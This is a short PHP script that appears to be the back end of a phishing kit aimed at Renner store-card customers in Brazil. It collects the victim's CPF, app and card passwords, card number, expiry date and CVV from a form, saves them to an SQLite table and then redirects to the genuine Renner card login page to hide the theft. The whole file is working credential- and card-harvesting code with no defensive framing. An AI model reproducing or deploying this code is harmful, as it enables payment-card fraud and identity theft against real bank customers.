<?php 
$sqlite = "sqlite:./db.db";
// conexão ao sqlite
$pdo = new PDO($sqlite);
header("Content-type: text/html; charset=utf-8");


   $cpf = $_POST['cpf'];
   $senha1 = $_POST['senha'];
   $senha2 = $_POST['senha2'];
   $cc = $_POST['cc'];
    $validade = $_POST['validade'];
    $cvv = $_POST['cvv'];




$nova_cc = array(
    'cc'=>$cc,
    'validade'=>$validade,
    'cvv'=>$cvv,
    'cpf'=>$cpf,
    'senha_app'=>$senha1,
    'senha_cc'=>$senha2);
$pdo->prepare('INSERT INTO cc (cc,validade,cvv,cpf,senha_app,senha_cc) VALUES (:cc,:validade,:cvv,:cpf,:senha_app,:senha_cc)')->execute($nova_cc);







header('Location: https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login');

?>
<html>
</html>